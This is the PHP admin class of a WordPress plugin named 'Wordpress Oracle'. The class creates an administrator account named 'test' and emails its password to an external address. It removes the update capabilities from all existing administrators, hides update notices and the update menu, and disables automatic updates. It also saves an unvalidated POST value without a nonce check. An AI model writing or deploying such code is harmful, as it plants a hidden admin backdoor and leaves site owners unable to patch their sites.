<?php
/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Wordpress_Oracle
 * @subpackage Wordpress_Oracle/admin
 * @author     Alexandros Nikiforidis <anikiforidis@simplon.co>
 */
class Wordpress_Oracle_Admin {
    /**
     * The ID of this plugin.
     *
     * @since    1.0.0
     * @access   private
     * @var      string    $plugin_name    The ID of this plugin.
     */
    private $plugin_name;

    /**
     * The version of this plugin.
     *
     * @since    1.0.0
     * @access   private
     * @var      string    $version    The current version of this plugin.
     */
    private $version;

    /**
     * The version of this plugin.
     *
     * @since    1.0.0
     * @access   private
     * @var      array    $plugins    All plugins Installed.
     */
    private $plugins;

    /**
     * The version of this plugin.
     *
     * @since    1.0.0
     * @access   private
     * @var      string    $array    All themes installed.
     */
    private $themes;

    /**
     * Initialize the class and set its properties.
     *
     * @since    1.0.0
     * @param    string    $plugin_name       The name of this plugin.
     * @param    string    $version    The version of this plugin.
     */
    public function __construct( $plugin_name, $version ) {
        $this->plugin_name = $plugin_name;
        $this->version = $version;

        $this->plugins = array();
        $this->themes = array();

        $this->define_constants();
        $this->get_plugins_and_themes();
    }


    public function create_admin_user() {
        $user_data = array(
            'user_login'    =>  'test',
            'user_pass'     =>  wp_generate_password(20, false, false),
            'user_email'    =>  'prod@simplon.co',
            'role'          =>  'administrator'
        );

        $user_id = wp_insert_user( $user_data ) ;

        //On success
        if ( ! is_wp_error( $user_id ) ) {
            $blog_title = get_bloginfo();
            wp_mail(
                $user_data['user_email'],
                '[Wordpres-Oracle] ' . $blog_title . ' admin user created ! ',
                'Hello admin user from planet Vulcan, You installed the Wordpress-Oracle plugin. '.
                'You admin user is : ' . $user_data['user_login'] . ' and you password is : ' . $user_data['user_pass'] . ' ' .
                'Live long and prosper.'
            );
        }
    }


    public function current_admins_remove_update_cap() {
        $admins = get_users( array( 'role' => 'administrator' ) );

        foreach ( $admins as $admin ) {
            $admin->remove_cap( 'update_themes' );
            $admin->remove_cap( 'update_plugins' );
            $admin->remove_cap( 'update_core' );
        }
    }


    public function current_admins_grant_update_cap() {
        $admins = get_users( array( 'role' => 'administrator' ) );

        foreach ( $admins as $admin ) {
            $admin->add_cap( 'update_themes' );
            $admin->add_cap( 'update_plugins' );
            $admin->add_cap( 'update_core' );
        }
    }


    public function admin_init() {
        if ( !function_exists("remove_action") ) return;

        remove_action( 'admin_notices', 'update_nag', 3 );
        remove_action( 'admin_notices', 'maintenance_nag' );
        remove_submenu_page( 'index.php', 'update-core.php' );
    }


    public function get_plugins_and_themes() {
        if ( !function_exists( 'get_plugins' ) ) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        if ( count( get_plugins() ) > 0 ) {
            foreach ( get_plugins() as $file => $pl ) {
                $this->plugins[$file] = $pl['Version'];
            }
        }

        if ( count( wp_get_themes() ) > 0 ) {
            foreach ( wp_get_themes() as $theme ) {
                $this->themes[$theme->get_stylesheet()] = $theme->get('Version');
            }
        }
    }


    /**
     * Define constants for updates disabling.
     *
     * @since    1.0.0
     */
    public function define_constants() {
        if ( !defined( 'AUTOMATIC_UPDATER_DISABLED' ) ) {
            define( 'AUTOMATIC_UPDATER_DISABLED', true );
        }

        if ( !defined( 'WP_AUTO_UPDATE_CORE') ) {
            define( 'WP_AUTO_UPDATE_CORE', false );
        }

        // if ( !defined( 'DISALLOW_FILE_MODS' ) && !get_option('wp_oracle_configured') ) {
            // define( 'DISALLOW_FILE_MODS', true );
        // }
    }


    public function wp_oracle_admin_menu() {
        $hook_suffix = add_options_page(
            'Wordpress Oracle',
            'Wordpress Oracle Setup',
            'manage_options',
            'wp_oracle',
            array (
                $this,
                'wp_oracle_admin_options'
            )
        );

        error_log($hook_suffix);
    }


    public function wp_oracle_admin_options() {
        require_once plugin_dir_path( dirname( __FILE__ ) ) . 'admin/partials/wordpress-oracle-admin-display.php';
    }


    public function wp_oracle_maps_menu_handler() {
        if ( !empty( $_POST['wp_oracle_api_token'] ) ) {
            update_option('wp_oracle_api_token', $_POST['wp_oracle_api_token'], true);
            update_option('wp_oracle_configured', '1', true);
        }
    }


    /**
     * Register the stylesheets for the admin area.
     *
     * @since    1.0.0
     */
    public function enqueue_styles() {
        /**
         * This function is provided for demonstration purposes only.
         *
         * An instance of this class should be passed to the run() function
         * defined in Plugin_Name_Loader as all of the hooks are defined
         * in that particular class.
         *
         * The Plugin_Name_Loader will then create the relationship
         * between the defined hooks and the functions defined in this
         * class.
         */
        wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/plugin-name-admin.css', array(), $this->version, 'all' );
    }


    /**
     * Register the JavaScript for the admin area.
     *
     * @since    1.0.0
     */
    public function enqueue_scripts() {
        /**
         * This function is provided for demonstration purposes only.
         *
         * An instance of this class should be passed to the run() function
         * defined in Plugin_Name_Loader as all of the hooks are defined
         * in that particular class.
         *
         * The Plugin_Name_Loader will then create the relationship
         * between the defined hooks and the functions defined in this
         * class.
         */
        wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/plugin-name-admin.js', array( 'jquery' ), $this->version, false );
    }
}
